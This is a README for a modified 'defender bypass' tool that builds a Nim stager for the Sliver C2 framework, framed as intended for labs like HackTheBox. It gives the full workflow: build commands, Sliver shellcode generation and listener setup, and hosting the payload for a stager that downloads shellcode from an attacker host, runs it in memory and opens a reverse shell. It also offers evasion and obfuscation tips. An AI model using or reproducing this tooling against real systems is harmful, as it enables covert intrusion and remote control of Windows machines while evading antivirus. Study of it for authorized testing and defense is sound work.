# Defender Bypass with Sliver - Multi-Port Edition

A modified version of [TeneBrae93's defender_bypass_with_sliver](https://github.com/TeneBrae93/defender_bypass_with_sliver) that adds support for **separate listener and web server ports**.

**Original Author:** TeneBrae93  
**Modifications:** Multi-port support for flexible deployment scenarios  
**Educational Resource:** [hacksmarter.org](https://hacksmarter.org)

---

## 🔧 What Changed

### The Problem
The original script required the **same port for both**:
- C2 listener port
- Shellcode web server port

This caused conflicts in labs like **HTB ProLabs** where you only have certain ports available.

### The Solution
This modified version adds a **`-w` (--webport)** argument, allowing you to:
- ✅ Run your C2 listener on one port (e.g., port 80)
- ✅ Host shellcode on a different port (e.g., port 443)
- ✅ Use whatever ports are available in your environment

---

## ⚠️ Legal Disclaimer

This tool is intended **exclusively for authorized security testing and educational purposes** in controlled environments such as:
- HackTheBox ProLabs
- Authorized penetration testing engagements
- Educational security courses
- Personal lab environments

**Unauthorized access to computer systems is illegal.** Always obtain proper authorization before using this tool.

---

## Features

✅ **Separate Port Support** - Use different ports for listener and web server  
✅ Windows executable generation with Defender evasion  
✅ Cross-compilation from Linux to Windows  
✅ Automatic dependency installation  
✅ In-memory shellcode execution  
✅ Integration with Sliver C2 framework  

---

## Requirements

### System Requirements
- Linux-based system (Ubuntu recommended)
- Internet connectivity for dependency installation

### Dependencies (auto-installed)
- **mingw-w64** - Cross-compiler for Windows targets
- **Nim** - Programming language compiler
- **winim** - Nim library for Windows API calls

---

## Installation

### 1. Clone This Repository
```bash
git clone https://github.com/yourusername/defender_bypass_with_sliver-multi-port.git
cd defender_bypass_with_sliver-multi-port
```

### 2. Make Script Executable
```bash
chmod +x builder.py
```

### 3. Optional: Pre-install Dependencies
The script will automatically install missing dependencies, but you can pre-install them:

```bash
sudo apt update
sudo apt install -y mingw-w64 nim
nimble install -y winim
```

---

## Usage

### Basic Syntax
```bash
python3 builder.py -l <LISTENER_IP> -p <LISTENER_PORT> -w <WEB_SERVER_PORT>
```

### Arguments
| Argument | Short | Long | Description | Required |
|----------|-------|------|-------------|----------|
| Listener IP | `-l` | `--ip` | IP address of your C2 listener | Yes |
| Listener Port | `-p` | `--port` | Port where C2 listener runs | Yes |
| Web Server Port | `-w` | `--webport` | Port where shellcode is hosted | Yes |

### Examples

#### HTB ProLabs - Port 80 Available Only
```bash
python3 builder.py -l 10.10.14.45 -p 80 -w 443
```
- Listener: `10.10.14.45:80`
- Shellcode: `10.10.14.45:443`

#### Multiple Available Ports
```bash
python3 builder.py -l 192.168.1.100 -p 5555 -w 8080
```

#### High Ports Only
```bash
python3 builder.py -l 10.10.10.50 -p 9001 -w 9002
```

---

## Complete Workflow

### Step 1: Generate the Stager
```bash
python3 builder.py -l 10.10.14.45 -p 80 -w 443
```

**Output:**
```
[SUCCESS] stager.exe has been generated!

[!] REMINDER: You must now generate the shellcode using Sliver.
    Run the following command in your Sliver console:

    generate --mtls 10.10.14.45:80 --os windows --arch amd64 --format shellcode

[!] Listener Configuration:
    - Listener IP: 10.10.14.45
    - Listener Port: 80
    - Web Server Port (shellcode): 443
```

### Step 2: Generate Shellcode with Sliver
In your Sliver C2 console:
```sliver
generate --mtls 10.10.14.45:80 --os windows --arch amd64 --format shellcode
```

This creates `shellc.bin` - save this file.

### Step 3: Start C2 Listener on Port 80
```sliver
mtls -l 0.0.0.0:80
```

### Step 4: Host Shellcode on Port 443
Navigate to the directory containing `shellc.bin`:

**Using Python 3:**
```bash
python3 -m http.server 443 --directory .
```

**Using Python 2:**
```bash
python -m SimpleHTTPServer 443
```

**Using Nginx:**
```nginx
server {
    listen 443;
    root /path/to/shellcode/;
    location /shellc.bin { }
}
```

### Step 5: Execute on Target
Deploy `stager.exe` on the target system. It will:
1. Download `shellc.bin` from `http://10.10.14.45:443/shellc.bin`
2. Allocate memory in the current process
3. Execute shellcode in-memory
4. Establish reverse shell to `10.10.14.45:80`

---

## Architecture

```
Target Machine (Windows)
│
├─► stager.exe (Generated)
│   │
│   ├─► HTTP GET on port 443
│   │    └──► Download shellc.bin
│   │         │
│   │         └──► In-memory execution
│   │              │
│   │              └──► mTLS reverse shell on port 80
│   │
│   └──► Callback to C2
│
Attacker Machine (Linux)
│
├─► Web Server (Port 443)
│   └──► Serves shellc.bin
│
└─► Sliver Listener (Port 80)
    └──► Receives reverse shell
```

---

## How It Works

### Key Improvements Over Original

| Feature | Original | This Version |
|---------|----------|--------------|
| Listener Port | Fixed (same as web) | Configurable `-p` |
| Web Server Port | Fixed (same as listener) | Configurable `-w` |
| Flexibility | Limited | High (HTB compatible) |
| Port Conflicts | Possible | Eliminated |

### Evasion Techniques
- **In-Memory Execution**: Shellcode never touches disk
- **Nim Language**: Less common AV signature target
- **Windows API**: Uses legitimate Windows API calls
- **Minimal Footprint**: ~2-5MB memory usage

---

## Troubleshooting

### `stager.exe` not generated
```
[!] Build failed: stager.exe was not produced.
```
**Solution:** Check for compiler errors above. Verify mingw-w64:
```bash
x86_64-w64-mingw32-gcc --version
```

### Port already in use
```bash
# Check what's using a port (e.g., 80)
sudo lsof -i :80

# Kill the process
sudo kill -9 <PID>
```

### Shellcode download fails on target
**Check:**
1. Web server is running: `netstat -tuln | grep 443`
2. `shellc.bin` exists in web root
3. Firewall allows outbound on port 443
4. Target can reach your IP

**Test from target:**
```cmd
curl http://YOUR_IP:443/shellc.bin
```

### Sliver listener not receiving connection
**Verify:**
1. Listener is running: `listeners`
2. Listener is on correct port: `mtls -l 0.0.0.0:80`
3. Firewall allows inbound on port 80
4. Correct IP in stager (check with `file stager.exe`)

---

## File Structure
```
.
├── README.md           # This file
├── builder.py          # Main builder script (MODIFIED)
├── stager.nim          # Generated Nim source
└── stager.exe          # Generated Windows executable
```

---

## Comparing to Original

### What's Different
```python
# ORIGINAL
parser.add_argument("-p", "--port", required=True, help="The listener port")
DownloadExecute("http://{ip}:{port}/shellc.bin")  # Same port

# THIS VERSION
parser.add_argument("-p", "--port", required=True, help="The listener port")
parser.add_argument("-w", "--webport", required=True, help="The web server port")
DownloadExecute("http://{ip}:{webport}/shellc.bin")  # Different port
```

### Why This Matters
In HTB ProLabs with limited available ports, you can now:
- Use port 80 for C2 listener (common for HTTP traffic)
- Use port 443 for shellcode delivery (HTTPS/SSL port)
- Or any combination that works in your environment

---

## Advanced Usage

### Obfuscation Techniques
Enhance evasion by modifying the Nim template in `builder.py`:

```nim
# Add delays
import os
sleep(2000)  # 2 second delay

# Add junk code
let x = 1 + 1
```

### Multiple Stagers
Generate stagers for different scenarios:
```bash
# Internal network
python3 builder.py -l 192.168.1.100 -p 80 -w 443

# External/VPN
python3 builder.py -l 10.10.14.45 -p 5555 -w 5556
```

### Custom Nim Flags
Edit the compilation command in `builder.py`:
```python
compile_command = (
    "nim c -d:mingw --os:windows "
    "-d:danger "  # Disable bounds checking
    "--cpu:amd64 "
    "--cc:gcc "
    "--gcc.exe:x86_64-w64-mingw32-gcc "
    "--gcc.linkerexe:x86_64-w64-mingw32-gcc "
    "stager.nim"
)
```

---

## Dependencies

### mingw-w64
Cross-compilation toolchain for Windows.
```bash
sudo apt install mingw-w64
```

### Nim
Compiled language with excellent Windows support.
```bash
sudo apt install nim
```

### winim
Nim bindings for Windows API.
```bash
nimble install winim
```

---

## Performance

- **Build Time:** ~10-30 seconds
- **Executable Size:** ~500KB-1MB
- **Memory Usage:** ~2-5MB
- **Detection Rate:** Very low (if used properly)

---

## Original Project

This is a modified version of [TeneBrae93/defender_bypass_with_sliver](https://github.com/TeneBrae93/defender_bypass_with_sliver)

**Credits to:**
- **TeneBrae93** - Original concept and implementation
- **Tyler Ramsbey** - hacksmarter.org resources

---

## Contributing

Found improvements? Submit issues and PRs!

---

## References

- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Nim Language](https://nim-lang.org/)
- [HackTheBox ProLabs](https://www.hackthebox.com/)
- [Original Project](https://github.com/TeneBrae93/defender_bypass_with_sliver)

---

## License

MIT License - See LICENSE file for details

---

## Disclaimer

This tool is for **authorized testing only**. Users are responsible for ensuring proper authorization. Unauthorized access is illegal. No liability for misuse.

---

**Version:** 2.0 (Multi-port support edition)  
**Last Updated:** 2024
